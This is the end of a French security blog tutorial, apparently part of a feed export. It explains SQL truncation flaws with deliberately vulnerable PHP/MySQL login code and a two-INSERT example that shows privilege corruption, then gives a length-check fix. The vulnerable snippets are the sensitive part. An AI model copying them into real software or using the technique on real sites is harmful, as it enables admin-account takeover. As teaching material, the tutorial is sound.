+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$_POST[password]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Suivi d'un test d'un type mysql_num_rows &amp;gt; 0 , l'utilisateur aurait accès au panel d’administration.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;    &lt;span class="nv"&gt;$db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;mysql_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nb"&gt;mysql_select_db&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;TEST_DAILYSECURITYDB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
+    &lt;span class="p"&gt;{&lt;/span&gt;
+       &lt;span class="nv"&gt;$sql&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT id FROM TEST_DAILYSECURITY WHERE login=&amp;#39;admin&amp;#39; AND password=&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nb"&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+       &lt;span class="nv"&gt;$req&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;mysql_query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$sql&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Erreur SQL !&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$sql&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nb"&gt;mysql_error&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+
+       &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;mysql_num_rows&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$req&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;// Si la requête retourne au moins un résultat, on accède à la zone administrateur&lt;/span&gt;
+       &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="c1"&gt;// ZONE ADMIN&lt;/span&gt;
+          &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Bienvenue Administrateur&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+       &lt;span class="p"&gt;}&lt;/span&gt;
+       &lt;span class="k"&gt;else&lt;/span&gt;
+       &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Location: &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;HTTP_REFERER&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+          &lt;span class="k"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+       &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;
+    &lt;span class="p"&gt;{&lt;/span&gt;
+       &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="s1"&gt;               Password: &amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot;&amp;gt;&amp;lt;/ br&amp;gt;&lt;/span&gt;
+&lt;span class="s1"&gt;               &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;Se Connecter&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="s1"&gt;             &amp;lt;/form&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="nb"&gt;mysql_close&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Un problème par requêtes multiples. On peut prendre comme exemple le &lt;a href="http://kitctf.de/writeups/gits2015/aart/"&gt;challenge aart&lt;/a&gt; de Ghost in the Shellcode qui avait deux requêtes insert à la suite, la deuxième utilisant une clause where sur un élément tronqué, un petit exemple:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;INSERT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;INTO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;VALUES&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$_POST[login]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$_POST[password]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;-- Si le login est supérieur à 12 il sera tronqué&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;INSERT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;INTO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AUTRE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TABLE_AVEC_IDUSER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;VALUES&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;,(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$_POST[login]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;-- Cette table contiendrait des données incorrectes, je vous laisse imaginer si c&amp;#39;était la table gérant les privilèges utilisateurs...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On a donc pu voir que les SQL truncations sont très dangereuses et fortement méconnues. A savoir que la faille fonctionne aussi sous &lt;a href="https://pastebin.com/1g3es9nq"&gt;PDO&lt;/a&gt;.   &lt;/p&gt;
+&lt;p&gt;La solution, pour patcher cette faille, est très simple:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Veuillez rentrer un login inférieur à 12 caractères&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;else&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="c1"&gt;// Vérification connexion administrateur et formulaire de connexion&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Voila, c'est déjà terminé, n'hésitez pas à rejoindre mon &lt;a href="https://twitter.com/Geluchat"&gt;Twitter&lt;/a&gt; pour avoir des news sur le site et mon point de vue sur l'actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="Journal de Geluchat"></category><category term="Failles Web"></category><category term="SQL"></category><category term="Tutoriel"></category></entry></feed>
